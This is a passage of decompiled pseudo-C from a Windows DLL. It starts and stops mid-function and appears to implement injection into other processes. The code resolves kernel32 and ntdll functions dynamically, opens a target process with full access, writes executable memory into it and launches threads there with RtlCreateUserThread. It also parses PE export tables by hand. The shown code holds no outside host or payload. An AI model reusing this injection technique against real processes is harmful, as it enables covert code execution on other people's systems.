  int v6[3]; // [esp+8h] [ebp-18h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  v3 = sub_1001C7FA(v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(_DWORD *))(*v3 + 36))(v3) == v2;
  v7 = -1;
  sub_100128CB(v6);
  if ( v4 )
    return 0;
  *a2 = sub_1001C871((int)&unk_10186970);
  return 1;
}
// 1001CF87: using guessed type int var_18[3];

//----- (1001CFF0) --------------------------------------------------------
_DWORD *__cdecl sub_1001CFF0(_DWORD *a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // ecx
  int v5; // edi
  int v6; // ecx
  char *v7; // eax
  const char *v9; // [esp-10h] [ebp-3Ch]
  _DWORD v10[5]; // [esp-8h] [ebp-34h] BYREF
  int v11[2]; // [esp+Ch] [ebp-20h] BYREF
  void *v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+18h] [ebp-14h]
  void *lp; // [esp+1Ch] [ebp-10h]
  int v15; // [esp+28h] [ebp-4h]

  sub_1000B1F3((void *)0x40, (int)a1, 0);
  v15 = 0;
  v13 = 1;
  sub_1000B79B(v3, a1);
  v5 = sub_1000B49B(a1, v4);
  sub_1000D17D(v11, aKernel32Dll_0);
  v15 = 1;
  lp = sub_1001E5C1((int)v11);
  LOBYTE(v15) = 0;
  sub_1000D3AD(v11);
  v10[1] = v6;
  v10[0] = v6;
  v12 = v10;
  sub_1000D17D(v10, aVirtualfree);
  v15 = 0;
  *(_DWORD *)(v5 + 4) = sub_1001E605((char *)lp);
  v12 = v10;
  sub_1000D17D(v10, aGetprocaddress);
  v15 = 0;
  *(_DWORD *)(v5 + 16) = sub_1001E605((char *)lp);
  v12 = v10;
  sub_1000D17D(v10, aGetmodulehandl_0);
  v15 = 0;
  *(_DWORD *)(v5 + 12) = sub_1001E605((char *)lp);
  v12 = v10;
  sub_1000D17D(v10, aOpenthread);
  v15 = 0;
  *(_DWORD *)v5 = sub_1001E605((char *)lp);
  v12 = v10;
  sub_1000D17D(v10, aExitthread);
  v15 = 0;
  v7 = sub_1001E605((char *)lp);
  v9 = dword_1017DB28;
  *(_DWORD *)(v5 + 8) = v7;
  *(_DWORD *)(v5 + 20) = a2;
  *(_DWORD *)(v5 + 24) = a3;
  strcpy((char *)(v5 + 28), v9);
  strcpy((char *)(v5 + 39), dword_1017DB24);
  *(_BYTE *)(a1[1] + 8) = 1;
  return a1;
}
// 1001D021: variable 'v3' is possibly undefined
// 1001D028: variable 'v4' is possibly undefined
// 1001D05C: variable 'v6' is possibly undefined

//----- (1001D167) --------------------------------------------------------
_DWORD *__cdecl sub_1001D167(_DWORD *a1, char *a2, char *a3)
{
  int v3; // ecx
  int v4; // ecx
  char **v5; // edi
  int v6; // ecx
  _DWORD v8[5]; // [esp-8h] [ebp-34h] BYREF
  int v9[2]; // [esp+Ch] [ebp-20h] BYREF
  void *v10; // [esp+14h] [ebp-18h]
  int v11; // [esp+18h] [ebp-14h]
  void *lp; // [esp+1Ch] [ebp-10h]
  int v13; // [esp+28h] [ebp-4h]

  sub_1000B1F3((void *)0x10, (int)a1, 0);
  v13 = 0;
  v11 = 1;
  sub_1000B79B(v3, a1);
  v5 = (char **)sub_1000B49B(a1, v4);
  sub_1000D17D(v9, aKernel32Dll_3);
  v13 = 1;
  lp = sub_1001E5C1((int)v9);
  LOBYTE(v13) = 0;
  sub_1000D3AD(v9);
  v8[1] = v6;
  v8[0] = v6;
  v10 = v8;
  sub_1000D17D(v8, aVirtualfree_0);
  v13 = 0;
  *v5 = sub_1001E605((char *)lp);
  v10 = v8;
  sub_1000D17D(v8, aExitthread_0);
  v13 = 0;
  v5[1] = sub_1001E605((char *)lp);
  v5[2] = a2;
  v5[3] = a3;
  *(_BYTE *)(a1[1] + 8) = 1;
  return a1;
}
// 1001D196: variable 'v3' is possibly undefined
// 1001D19D: variable 'v4' is possibly undefined
// 1001D1CE: variable 'v6' is possibly undefined

//----- (1001D244) --------------------------------------------------------
_DWORD *__thiscall sub_1001D244(_DWORD *this, _DWORD *a2, int a3, char *a4, char a5, int Block)
{
  _DWORD *v6; // edi
  void *v7; // esi
  wchar_t *v8; // eax
  int v9; // ecx
  int v10; // eax
  _DWORD *v11; // eax
  int v12; // edi
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  wchar_t *v15; // eax
  int v16; // ecx
  void *v17; // edi
  _DWORD *v19; // esi
  _DWORD *v20; // ebx
  int v21; // eax
  _DWORD *v22; // eax
  int v23; // eax
  int v24; // ecx
  _DWORD *v25; // esi
  _DWORD *v26; // ebx
  void *v27; // edi
  int v28; // eax
  int v29; // ecx
  _DWORD *v30; // esi
  int *v31; // eax
  int v32; // esi
  _DWORD *v33; // esi
  _DWORD v34[3]; // [esp-30h] [ebp-1F8h] BYREF
  int v35; // [esp-24h] [ebp-1ECh] BYREF
  int v36; // [esp-20h] [ebp-1E8h] BYREF
  int v37; // [esp-1Ch] [ebp-1E4h]
  int v38; // [esp-18h] [ebp-1E0h]
  _DWORD v39[2]; // [esp-8h] [ebp-1D0h] BYREF
  int v40; // [esp+0h] [ebp-1C8h] BYREF
  HANDLE v41[7]; // [esp+Ch] [ebp-1BCh] BYREF
  int v42[5]; // [esp+28h] [ebp-1A0h] BYREF
  void **v43; // [esp+3Ch] [ebp-18Ch]
  int v44[5]; // [esp+44h] [ebp-184h] BYREF
  int v45[5]; // [esp+58h] [ebp-170h] BYREF
  int v46[5]; // [esp+6Ch] [ebp-15Ch] BYREF
  _DWORD v47[2]; // [esp+80h] [ebp-148h] BYREF
  _DWORD v48[8]; // [esp+88h] [ebp-140h] BYREF
  char v49; // [esp+A8h] [ebp-120h]
  _DWORD v50[10]; // [esp+ACh] [ebp-11Ch] BYREF
  char v51; // [esp+D4h] [ebp-F4h]
  int v52[3]; // [esp+DCh] [ebp-ECh] BYREF
  int v53; // [esp+E8h] [ebp-E0h]
  int v54[2]; // [esp+F0h] [ebp-D8h] BYREF
  int v55[6]; // [esp+F8h] [ebp-D0h] BYREF
  void *v56; // [esp+110h] [ebp-B8h]
  char v57; // [esp+118h] [ebp-B0h]
  int v58[6]; // [esp+11Ch] [ebp-ACh] BYREF
  _DWORD v59[2]; // [esp+134h] [ebp-94h] BYREF
  int v60; // [esp+13Ch] [ebp-8Ch] BYREF
  int v61[2]; // [esp+140h] [ebp-88h] BYREF
  SIZE_T v62[2]; // [esp+148h] [ebp-80h] BYREF
  int v63[3]; // [esp+150h] [ebp-78h] BYREF
  int v64; // [esp+15Ch] [ebp-6Ch] BYREF
  int v65[2]; // [esp+160h] [ebp-68h] BYREF
  int v66; // [esp+168h] [ebp-60h] BYREF
  int v67[2]; // [esp+16Ch] [ebp-5Ch] BYREF
  int v68[2]; // [esp+178h] [ebp-50h] BYREF
  int v69[2]; // [esp+180h] [ebp-48h] BYREF
  int v70; // [esp+188h] [ebp-40h]
  DWORD v71; // [esp+18Ch] [ebp-3Ch] BYREF
  SIZE_T nSize[2]; // [esp+190h] [ebp-38h] BYREF
  int v73; // [esp+198h] [ebp-30h] BYREF
  _DWORD *v74[2]; // [esp+19Ch] [ebp-2Ch] BYREF
  int v75[2]; // [esp+1A4h] [ebp-24h] BYREF
  void *v76; // [esp+1ACh] [ebp-1Ch]
  _DWORD *v77; // [esp+1B0h] [ebp-18h]
  void *v78[2]; // [esp+1B4h] [ebp-14h] BYREF
  int v79; // [esp+1C4h] [ebp-4h]

  v78[1] = &v40;
  v6 = this;
  v77 = this;
  v70 = 0;
  v7 = (void *)Block;
  if ( Block )
  {
    if ( (dword_10193B38 & 1) == 0 )
    {
      dword_10193B38 |= 1u;
      v79 = 1;
      sub_1000D17D(v75, aNtdllDll_2);
      LOBYTE(v79) = 2;
      v8 = (wchar_t *)sub_1000CC40((int)&unk_10179880);
      v39[0] = v9;
      v76 = v39;
      sub_1000D17D(v39, v8);
      LOBYTE(v79) = 2;
      dword_101835E8 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1001E665((int)v75);
      LOBYTE(v79) = 1;
      sub_1000D3AD(v75);
      LOBYTE(v79) = 0;
    }
    memset(v58, 0, sizeof(v58));
    if ( dword_101835E8(*(_DWORD *)(v6[1] + 16), 0, v58, 24, 0) < 0 )
    {
      v10 = dword_101835E8(*(_DWORD *)(v6[1] + 16), 0, v58, 24, 0);
      v11 = sub_10050D97(v74, v10);
      v79 = 4;
      sub_10015338((int)v11, 463);
    }
    v78[0] = v7;
    while ( 1 )
    {
      sub_1000B1F3((void *)0xA4, (int)nSize, 0);
      v79 = 5;
      sub_1001FA9F(v58[1], (int)v6, (int)v54, 164);
      LOBYTE(v79) = 6;
      if ( sub_1001FFEF(v55, nSize) != 164 )
      {
        v14 = sub_1000E7F7(&a5, 1, 0);
        LOBYTE(v79) = 7;
        v38 = 472;
        goto LABEL_17;
      }
      v12 = sub_1000B4B8(nSize);
      if ( *(_DWORD *)(v12 + 12) )
      {
        sub_1000B1F3((void *)0x18, (int)v62, 0);
        LOBYTE(v79) = 8;
        sub_1001FA9F(*(_DWORD *)(v12 + 160), (int)v77, (int)v47, 24);
        LOBYTE(v79) = 9;
        if ( sub_1001FFEF(v48, v62) != 24 )
        {
          v14 = sub_1000E7F7(&a5, 1, 0);
          LOBYTE(v79) = 10;
          v38 = 481;
          goto LABEL_17;
        }
        if ( *(_DWORD *)(sub_1000B4B8(v62) + 4) == -1 )
        {
          LOBYTE(v79) = 8;
          sub_1001FBA6((int)v47);
          LOBYTE(v79) = 6;
          sub_1000B3DF((int *)v62);
          LOBYTE(v79) = 5;
          sub_1001FBA6((int)v54);
          LOBYTE(v79) = 0;
          sub_1000B3DF((int *)nSize);
          v6 = v77;
          break;
        }
        LOBYTE(v79) = 8;
        sub_1001FBA6((int)v47);
        LOBYTE(v79) = 6;
        sub_1000B3DF((int *)v62);
      }
      Sleep(0xAu);
      v78[0] = (char *)v78[0] - 10;
      LOBYTE(v79) = 5;
      sub_1001FBA6((int)v54);
      LOBYTE(v79) = 0;
      sub_1000B3DF((int *)nSize);
      if ( !v78[0] && Block != -1 )
      {
        v13 = sub_10015CF9(&a5, 1);
        v79 = 11;
        v38 = 496;
        sub_1001E569((int)v13);
      }
      v6 = v77;
    }
  }
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, DWORD *))(*v6 + 76))(v6, &v71) )
  {
    sub_1001C7A1(&v66, 0, 0);
    v79 = 15;
    sub_10057D8D(v59);
    LOBYTE(v79) = 17;
    v19 = sub_1001CA35(v71, &v73, 0x1F0FFFu);
    LOBYTE(v79) = 18;
    sub_100130E8(v19 + 1, v67);
    v67[1] = v19[2];
    LOBYTE(v79) = 17;
    sub_100128CB(&v73);
    v79 = 16;
    sub_1001FB4A((int)v50);
    LOBYTE(v79) = 26;
    sub_10012621(&v64, 0, 0);
    LOBYTE(v79) = 27;
    sub_10012621(&v60, 0, 0);
    LOBYTE(v79) = 29;
    sub_1000D17D(v75, &word_10179950);
    LOBYTE(v79) = 30;
    v20 = v77;
    v21 = sub_1001C78D(v77);
    sub_1000D6C3((int)v75, aThPoolShdPqomg, v21);
    v22 = sub_1000B87D(v69);
    LOBYTE(v79) = 31;
    sub_1001EF3B((int)v41, v75, (const WCHAR *)1, *(LPSECURITY_ATTRIBUTES *)(*v22 + 4));
    LOBYTE(v79) = 33;
    sub_10007D7A((void **)v69);
    sub_1000EDE4((int *)v41, v74);
    LOBYTE(v79) = 34;
    sub_1000D17D(v69, &word_10179990);
    LOBYTE(v79) = 35;
    v23 = sub_1001C78D(v20);
    sub_1000D6C3((int)v69, aThPoolShdMtxGm, v23);
    v24 = v37;
    v37 = 1;
    v36 = v24;
    v35 = v24;
    v76 = &v35;
    sub_1000D372(&v35, (int)v69);
    LOBYTE(v79) = 35;
    sub_1002236A(v42, v35, v36, (LPCWSTR)v37);
    LOBYTE(v79) = 37;
    if ( *v43 )
    {
      v76 = *v43;
    }
    else
    {
      sub_1000B1F3((void *)(&byte_100A0632 - (char *)sub_100A0607), (int)v44, sub_100A0607);
      LOBYTE(v79) = 38;
      v25 = v77;
      (*(void (__thiscall **)(_DWORD *, int *, int, int, int))(*v77 + 44))(v77, v54, v44[3], 64, 4096);
      LOBYTE(v79) = 39;
      v57 = 1;
      sub_1001FDAF(v54, v44);
      v57 = 0;
      v76 = v56;
      *v43 = v56;
      v26 = sub_1001C7FA(v63);
      LOBYTE(v79) = 40;
      v27 = (void *)v42[3];
      sub_1001C78D(v25);
      v28 = sub_1001C78D(v26);
      sub_10011C23(v27, 0, v28);
      LOBYTE(v79) = 39;
      sub_100128CB(v63);
      LOBYTE(v79) = 38;
      sub_1001FBA6((int)v54);
      LOBYTE(v79) = 37;
      sub_1000B3DF(v44);
      v20 = v77;
    }
    LOBYTE(v79) = 35;
    sub_100172D3(v42);
    LOBYTE(v79) = 34;
    sub_1000D3AD(v69);
    LOBYTE(v79) = 33;
    sub_1000EDA4(v74);
    LOBYTE(v79) = 30;
    sub_1001F16A(v41);
    LOBYTE(v79) = 29;
    sub_1000D3AD(v75);
    sub_1001D167(v45, (char *)a3, a4);
    LOBYTE(v79) = 41;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int, int, int))(*v20 + 44))(v20, v47, v45[3], 64, 4096);
    LOBYTE(v79) = 42;
    v49 = 0;
    sub_1001FDAF(v47, v45);
    sub_1000D17D(v75, aNtdllDll_3);
    LOBYTE(v79) = 43;
    v34[1] = v29;
    v34[0] = v29;
    a4 = (char *)v34;
    sub_1000D17D(v34, aRtlcreateusert);
    LOBYTE(v79) = 43;
    a4 = sub_1001E665((int)v75);
    LOBYTE(v79) = 42;
    sub_1000D3AD(v75);
    Block = 0;
    a3 = 128;
    sub_100219DF(&a3, (int)&v73);
    LOBYTE(v79) = 45;
    if ( ((int (__cdecl *)(_DWORD, _DWORD, int, _DWORD, _DWORD, _DWORD, void *, _DWORD, int *, int *))a4)(
           *(_DWORD *)(v20[1] + 16),
           0,
           1,
           0,
           0,
           0,
           v76,
           v48[6],
           &Block,
           v68) )
    {
      v14 = sub_1000E7F7(&a5, 1, 0);
      LOBYTE(v79) = 46;
    }
    else
    {
      sub_10021A37((int)&v73);
      if ( Block )
      {
        v30 = sub_10012621(v63, (void *)Block, 0);
        LOBYTE(v79) = 48;
        sub_100130E8(v30 + 1, v65);
        v65[1] = v30[2];
        LOBYTE(v79) = 45;
        sub_10012679(v63);
        sub_1000B1F3((void *)(&byte_100A0606 - (char *)sub_100A05A1), (int)v46, sub_100A05A1);
        LOBYTE(v79) = 49;
        sub_1001CFF0(v52, v68[0], v68[1]);
        LOBYTE(v79) = 50;
        v31 = (int *)sub_1001CE7A(&v66, (int)v54, v53 + v46[3], 0x40u, 0x1000u);
        LOBYTE(v79) = 51;
        sub_1001FCC0(v31, (int)v50);
        LOBYTE(v79) = 50;
        sub_1001FBA6((int)v54);
        v51 = 1;
        v78[0] = 0;
        v32 = v50[8];
        sub_1000B63D(v52, (int)&v58[1], v46);
        LOBYTE(v79) = 52;
        sub_1001FDAF(v50, &v58[1]);
        if ( ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, void **, _DWORD))a4)(
               *(_DWORD *)(v67[0] + 16),
               0,
               0,
               0,
               0,
               0,
               v32 + v53,
               v32,
               v78,
               0) )
        {
          v14 = sub_1000E7F7(&a5, 1, 0);
          LOBYTE(v79) = 53;
        }
        else if ( v78[0] )
        {
          v51 = 0;
          v33 = sub_10012621(v63, v78[0], 0);
          LOBYTE(v79) = 55;
          sub_100130E8(v33 + 1, v61);
          v61[1] = v33[2];
          LOBYTE(v79) = 52;
          sub_10012679(v63);
          sub_10012EAB((int)&v60, 1000, 0);
          v51 = 1;
          if ( a5 || sub_10012837(&v64) )
          {
            LOBYTE(v79) = 50;
            sub_1000B3DF(&v58[1]);
            LOBYTE(v79) = 49;
            sub_1000B3DF(v52);
            LOBYTE(v79) = 45;
            sub_1000B3DF(v46);
            LOBYTE(v79) = 42;
            sub_10021A57(&v73);
            LOBYTE(v79) = 41;
            sub_1001FBA6((int)v47);
            LOBYTE(v79) = 29;
            sub_1000B3DF(v45);
            v79 = 28;
            sub_10012A1E((int)&v64, a2);
            v70 = 1;
            LOBYTE(v79) = 27;
            sub_10012679(&v60);
            LOBYTE(v79) = 26;
            sub_10012679(&v64);
            LOBYTE(v79) = 16;
            sub_1001FBA6((int)v50);
            LOBYTE(v79) = 15;
            sub_10020B81(v59);
            LOBYTE(v79) = 0;
            sub_100128CB(&v66);
            return a2;
          }
          v14 = sub_1000E7F7(&a5, 1, 0);
          LOBYTE(v79) = 56;
        }
        else
        {
          v14 = sub_1000E7F7(&a5, 1, 0);
          LOBYTE(v79) = 54;
        }
      }
      else
      {
        v14 = sub_1000E7F7(&a5, 1, 0);
        LOBYTE(v79) = 47;
      }
    }
LABEL_17:
    sub_10007882((int)v14);
  }
  v15 = (wchar_t *)sub_1000CC40((int)&unk_101798F0);
  v36 = v16;
  Block = (int)&v36;
  sub_1000D17D(&v36, v15);
  v79 = 0;
  v76 = sub_1001E665((int)&unk_101869D8);
  Block = 128;
  sub_100219DF(&Block, (int)&v73);
  v79 = 13;
  v17 = (void *)((int (__cdecl *)(_DWORD, _DWORD, _DWORD, int, char *, int, _DWORD))v76)(
                  *(_DWORD *)(v6[1] + 16),
                  0,
                  0,
                  a3,
                  a4,
                  a5 != 0 ? 4 : 0,
                  0);
  sub_10021A37((int)&v73);
  if ( !v17 )
  {
    v14 = sub_1000E7F7(&a5, 1, 0);
    LOBYTE(v79) = 14;
    goto LABEL_17;
  }
  sub_10012621(a2, v17, 0);
  v70 = 1;
  LOBYTE(v79) = 0;
  sub_10021A57(&v73);
  return a2;
}
// 1001D2A0: variable 'v9' is possibly undefined
// 1001D4E9: variable 'v16' is possibly undefined
// 1001D994: variable 'v29' is possibly undefined
// 100227A3: using guessed type void __stdcall __noreturn sub_100227A3(_DWORD);
// 100A0606: using guessed type char byte_100A0606;
// 100A0632: using guessed type char byte_100A0632;
// 101835E8: using guessed type int (__cdecl *dword_101835E8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10193B38: using guessed type int dword_10193B38;
// 1001D244: using guessed type int var_D0[6];
// 1001D244: using guessed type _DWORD var_148[2];
// 1001D244: using guessed type _DWORD var_94[2];
// 1001D244: using guessed type HANDLE var_1BC[7];
// 1001D244: using guessed type int var_78[3];
// 1001D244: using guessed type int var_EC[3];

//----- (1001DD0D) --------------------------------------------------------
_DWORD *__thiscall sub_1001DD0D(_DWORD *this, _DWORD *a2, DWORD DesiredAccess)
{
  int v3; // eax
  _DWORD *v4; // eax
  HANDLE v6[4]; // [esp+4h] [ebp-20h] BYREF
  HANDLE TokenHandle[4]; // [esp+14h] [ebp-10h] BYREF

  v6[3] = 0;
  v3 = this[1];
  TokenHandle[0] = 0;
  if ( !OpenProcessToken(*(HANDLE *)(v3 + 16), DesiredAccess, TokenHandle) )
  {
    v4 = sub_1000E9DF(v6, 1, 1);
    TokenHandle[3] = HANDLE_FLAG_INHERIT;
    sub_1000A947(v4, 685);
  }
  sub_1001B526(a2, TokenHandle[0]);
  return a2;
}

//----- (1001DD7B) --------------------------------------------------------
DWORD __thiscall sub_1001DD7B(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v4[3]; // [esp+4h] [ebp-1Ch] BYREF
  DWORD pSessionId[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = sub_1001C78D(this);
  if ( !ProcessIdToSessionId(v1, pSessionId) )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    pSessionId[3] = 0;
    sub_1000A947(v2, 692);
  }
  return pSessionId[0];
}
// 1001DD7B: using guessed type int var_1C[3];

//----- (1001DDCA) --------------------------------------------------------
DWORD __thiscall sub_1001DDCA(void *this, int a2)
{
  int v3; // ecx
  char *v4; // eax
  DWORD v5; // esi
  _DWORD v7[2]; // [esp+4h] [ebp-7Ch] BYREF
  int v8; // [esp+Ch] [ebp-74h]
  int v9; // [esp+10h] [ebp-70h]
  int v10; // [esp+14h] [ebp-6Ch]
  void *v11; // [esp+20h] [ebp-60h]
  int v12[3]; // [esp+24h] [ebp-5Ch] BYREF
  int v13[5]; // [esp+30h] [ebp-50h] BYREF
  _DWORD v14[10]; // [esp+44h] [ebp-3Ch] BYREF
  char v15; // [esp+6Ch] [ebp-14h]
  int v16; // [esp+7Ch] [ebp-4h]

  sub_1000B261(a2, (int)v13, 0);
  v16 = 0;
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 44))(this, v14, v13[3], 64, 4096);
  LOBYTE(v16) = 1;
  v15 = 1;
  sub_1001FDAF(v14, v13);
  v10 = 60000;
  v9 = 0;
  v8 = v14[8];
  v7[1] = v3;
  v7[0] = v3;
  v11 = v7;
  sub_1000D17D(v7, aGetmodulehandl);
  LOBYTE(v16) = 1;
  v4 = sub_1001E665((int)&unk_101869D8);
  (*(void (__thiscall **)(void *, int *, char *, int, int, int))(*(_DWORD *)this + 56))(this, v12, v4, v8, v9, v10);
  LOBYTE(v16) = 3;
  sub_10012EAB((int)v12, 5000, 0);
  v5 = sub_100126A3(v12);
  LOBYTE(v16) = 1;
  sub_10012679(v12);
  LOBYTE(v16) = 0;
  sub_1001FBA6((int)v14);
  v16 = -1;
  sub_1000B3DF(v13);
  return v5;
}
// 1001DE3A: variable 'v3' is possibly undefined
// 1001DDCA: using guessed type int var_5C[3];

//----- (1001DECF) --------------------------------------------------------
int __thiscall sub_1001DECF(void *this, int a2, int a3)
{
  _DWORD *v4; // eax
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // ebx
  int v8; // eax
  int v9; // eax
  int v10; // eax
  unsigned __int16 v12; // ax
  int v13; // esi
  _DWORD *v14; // [esp+Ch] [ebp-1DCh] BYREF
  int v15; // [esp+10h] [ebp-1D8h]
  int v16[2]; // [esp+14h] [ebp-1D4h] BYREF
  char v17[16]; // [esp+1Ch] [ebp-1CCh] BYREF
  SIZE_T v18[5]; // [esp+2Ch] [ebp-1BCh] BYREF
  SIZE_T v19[5]; // [esp+40h] [ebp-1A8h] BYREF
  SIZE_T v20[5]; // [esp+54h] [ebp-194h] BYREF
  SIZE_T nSize[5]; // [esp+68h] [ebp-180h] BYREF
  SIZE_T v22[5]; // [esp+7Ch] [ebp-16Ch] BYREF
  SIZE_T v23[5]; // [esp+90h] [ebp-158h] BYREF
  _DWORD v24[2]; // [esp+A4h] [ebp-144h] BYREF
  int v25[9]; // [esp+ACh] [ebp-13Ch] BYREF
  _DWORD v26[2]; // [esp+D0h] [ebp-118h] BYREF
  int v27[9]; // [esp+D8h] [ebp-110h] BYREF
  char v28[8]; // [esp+FCh] [ebp-ECh] BYREF
  char v29[36]; // [esp+104h] [ebp-E4h] BYREF
  char v30[8]; // [esp+128h] [ebp-C0h] BYREF
  int v31[9]; // [esp+130h] [ebp-B8h] BYREF
  char v32[8]; // [esp+154h] [ebp-94h] BYREF
  int v33[9]; // [esp+15Ch] [ebp-8Ch] BYREF
  char v34[8]; // [esp+180h] [ebp-68h] BYREF
  int v35[9]; // [esp+188h] [ebp-60h] BYREF
  char v36[8]; // [esp+1ACh] [ebp-3Ch] BYREF
  int v37[10]; // [esp+1B4h] [ebp-34h] BYREF
  int v38; // [esp+1E4h] [ebp-4h]

  if ( !a2 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    v38 = 0;
    goto LABEL_3;
  }
  sub_1001FA9F(a2, (int)this, (int)v36, 64);
  v38 = 1;
  sub_1000B1F3((void *)0x40, (int)nSize, 0);
  LOBYTE(v38) = 2;
  if ( sub_1001FFEF(v37, nSize) != 64 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 3;
    goto LABEL_3;
  }
  v5 = sub_1000B4B8(nSize);
  if ( *(_WORD *)v5 != 23117 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 4;
    goto LABEL_3;
  }
  sub_1001FA9F(*(_DWORD *)(v5 + 60) + a2 + 24, (int)this, (int)v32, 224);
  LOBYTE(v38) = 5;
  sub_1000B1F3((void *)0xE0, (int)v19, 0);
  LOBYTE(v38) = 6;
  if ( sub_1001FFEF(v33, v19) != 224 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 7;
    goto LABEL_3;
  }
  v6 = sub_1000B4B8(v19);
  if ( *(_WORD *)v6 != 267 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 8;
    goto LABEL_3;
  }
  sub_1001FA9F(*(_DWORD *)(v6 + 96) + a2, (int)this, (int)v30, 40);
  LOBYTE(v38) = 9;
  sub_1000B1F3((void *)0x28, (int)v18, 0);
  LOBYTE(v38) = 10;
  if ( sub_1001FFEF(v31, v18) != 40 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 11;
    goto LABEL_3;
  }
  v7 = (_DWORD *)sub_1000B4B8(v18);
  v8 = v7[8];
  v14 = v7;
  if ( !v8 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 12;
    goto LABEL_3;
  }
  sub_1001FA9F(v8 + a2, (int)this, (int)v34, 4 * v7[6]);
  LOBYTE(v38) = 13;
  v9 = v7[9];
  if ( !v9 )
  {
    v4 = sub_1000E7F7(&v14, 1, 0);
    LOBYTE(v38) = 14;
    goto LABEL_3;
  }
  sub_1001FA9F(v9 + a2, (int)this, (int)v26, 2 * v7[5]);
  LOBYTE(v38) = 15;
  sub_1001FA9F(a2 + v7[7], (int)this, (int)v24, 4 * v7[5]);
  LOBYTE(v38) = 16;
  v15 = 0;
  if ( v7[6] )
  {
    while ( 1 )
    {
      sub_1000B1F3((void *)4, (int)v20, 0);
      LOBYTE(v38) = 17;
      if ( sub_1001FFEF(v35, v20) != 4 )
      {
        v4 = sub_1000E7F7(&v14, 1, 0);
        LOBYTE(v38) = 18;
        goto LABEL_3;
      }
      v10 = sub_1000B6F2(v20, 0);
      sub_1001FA9F(v10 + a2, (int)this, (int)v28, 0);
      LOBYTE(v38) = 19;
      sub_100223C7(v29, (int)v17);
      LOBYTE(v38) = 20;
      sub_100224C0(v17, v16);
      LOBYTE(v38) = 21;
      if ( !sub_1000D65C(a3, (int)v16) )
        break;
      LOBYTE(v38) = 20;
      sub_1000D3AD(v16);
      LOBYTE(v38) = 19;
      sub_10022419(v17);
      LOBYTE(v38) = 17;
      sub_1001FBA6((int)v28);
      LOBYTE(v38) = 16;
      sub_1000B3DF((int *)v20);
      if ( (unsigned int)++v15 >= v14[6] )
        goto LABEL_22;
    }
    sub_1001FF1A(v26, 2 * v15, 0);
    sub_1000B1F3((void *)2, (int)v23, 0);
    LOBYTE(v38) = 22;
    if ( sub_1001FFEF(v27, v23) != 2 )
    {
      v4 = sub_1000E7F7(&v14, 1, 0);
      LOBYTE(v38) = 23;
      goto LABEL_3;
    }
    v12 = sub_1000B746(v23, 0);
    sub_1001FF1A(v24, 4 * v12, 0);
    sub_1000B1F3((void *)4, (int)v22, 0);
    LOBYTE(v38) = 24;
    if ( sub_1001FFEF(v25, v22) != 4 )
    {
      v4 = sub_1000E7F7(&v14, 1, 0);
      LOBYTE(v38) = 25;
LABEL_3:
      sub_10007882((int)v4);
    }
    v13 = sub_1000B6F2(v22, 0) + a2;
    LOBYTE(v38) = 22;
    sub_1000B3DF((int *)v22);
    LOBYTE(v38) = 21;
    sub_1000B3DF((int *)v23);
    LOBYTE(v38) = 20;
    sub_1000D3AD(v16);
    LOBYTE(v38) = 19;
    sub_10022419(v17);
    LOBYTE(v38) = 17;
    sub_1001FBA6((int)v28);
    LOBYTE(v38) = 16;
    sub_1000B3DF((int *)v20);
    LOBYTE(v38) = 15;
    sub_1001FBA6((int)v24);
    LOBYTE(v38) = 13;
    sub_1001FBA6((int)v26);
    LOBYTE(v38) = 10;
    sub_1001FBA6((int)v34);
    LOBYTE(v38) = 9;
    sub_1000B3DF((int *)v18);
    LOBYTE(v38) = 6;
    sub_1001FBA6((int)v30);
    LOBYTE(v38) = 5;
    sub_1000B3DF((int *)v19);
    LOBYTE(v38) = 2;
    sub_1001FBA6((int)v32);
    LOBYTE(v38) = 1;
    sub_1000B3DF((int *)nSize);
    v38 = -1;
    sub_1001FBA6((int)v36);
    return v13;
  }
  else
  {
LABEL_22:
    LOBYTE(v38) = 15;
    sub_1001FBA6((int)v24);
    LOBYTE(v38) = 13;
    sub_1001FBA6((int)v26);
    LOBYTE(v38) = 10;
    sub_1001FBA6((int)v34);
    LOBYTE(v38) = 9;
    sub_1000B3DF((int *)v18);
    LOBYTE(v38) = 6;
    sub_1001FBA6((int)v30);
    LOBYTE(v38) = 5;
    sub_1000B3DF((int *)v19);
    LOBYTE(v38) = 2;
    sub_1001FBA6((int)v32);
    LOBYTE(v38) = 1;
    sub_1000B3DF((int *)nSize);
    v38 = -1;
    sub_1001FBA6((int)v36);
    return 0;
  }
}
// 1001DECF: using guessed type int var_34[10];
// 1001DECF: using guessed type int var_8C[9];
// 1001DECF: using guessed type int var_B8[9];
// 1001DECF: using guessed type _DWORD var_118[2];
// 1001DECF: using guessed type _DWORD var_144[2];
// 1001DECF: using guessed type int var_60[9];
// 1001DECF: using guessed type char var_E4[36];
// 1001DECF: using guessed type int var_110[9];
// 1001DECF: using guessed type int var_13C[9];

//----- (1001E54B) --------------------------------------------------------
int __thiscall sub_1001E54B(int *this, int a2, int a3)
{
  int v4; // esi
  int v5; // eax

  v4 = *this;
  v5 = (*(int (__thiscall **)(int *, int, int))(*this + 60))(this, a2, a3);
